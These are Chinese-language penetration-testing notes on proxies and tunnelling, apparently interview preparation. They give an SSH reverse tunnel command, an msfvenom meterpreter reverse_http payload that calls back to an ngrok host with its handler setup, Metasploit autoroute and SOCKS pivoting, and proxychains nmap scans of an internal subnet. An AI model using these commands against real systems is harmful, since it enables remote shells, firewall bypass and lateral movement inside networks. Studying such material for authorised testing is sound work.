### 代理隧道

#### 反弹shell

在面试题里大部分记过了，此外还有ssh反向连接

~~~
ssh -f -N -R 10000:localhost:22 lyb@3322.org
~~~

10000是主机B上的本地连接端口， 22是主机B上远程连接的那个端口，lyb@3322.org是对方的地址，主机b运行

~~~
ssh lyb@localhost -p 10000
~~~



#### 端口转发

###### lcx（经典）

###### FPipe

###### Ssocks

#### 正向代理和反向代理

###### frp

https://github.com/fatedier/frp/

可用于内网穿透的高性能的反向代理应用，，支持 tcp, udp 协议，为 http 和 https 应用协议提供了额外的能力，且尝试性支持了点对点穿透

#### web代理

###### reGeorg

[![oIXxU0.png](https://s1.ax1x.com/2021/12/10/oIXxU0.png)](https://imgtu.com/i/oIXxU0)

![](https://s4.ax1x.com/2022/01/17/7Uti6O.jpg)

代理是实现内网之间的通信；隧道是实现防火墙绕过，流量监控

#### ngrok

![](https://s4.ax1x.com/2022/01/17/7UN2ZQ.jpg)

~~~
msfvenom -p windows/meterpreter/reverse_http lhost=xiaodisec.free.idcfengye.com lport=80 -f exe -o
test.exe
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost 192.168.76.132
set lport 4444
exploit
~~~



~~~
查看路由地址：run autoroute -p
添加路由地址：run autoroute -s 192.168.22.0/24
开启本地代理：
use auxiliary/server/socks4a
set srvport 2222
exploit

配置 proxychains 后调用工具探针 Target2
/etc/proxychains.conf
socks4 192.168.76.132 2222
proxychains4 nmap -sT -Pn 192.168.22.0/24 -p80
-Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。
-sT：扫描 TCP 数据包已建立的连接 connect
windows：
利用代理工具 Proxifier 或 SocksCap64 载入代理进行进程访问测试
~~~



~~~
网络层：IPv6 隧道、ICMP 隧道
传输层：TCP 隧道、UDP 隧道、常规端口转发
应用层：SSH 隧道、HTTP/S 隧道、DNS 隧道
~~~

CS、MSF 无法上线，数据传输不稳定无回显，出口数据被监控，网络通信存在问题等





























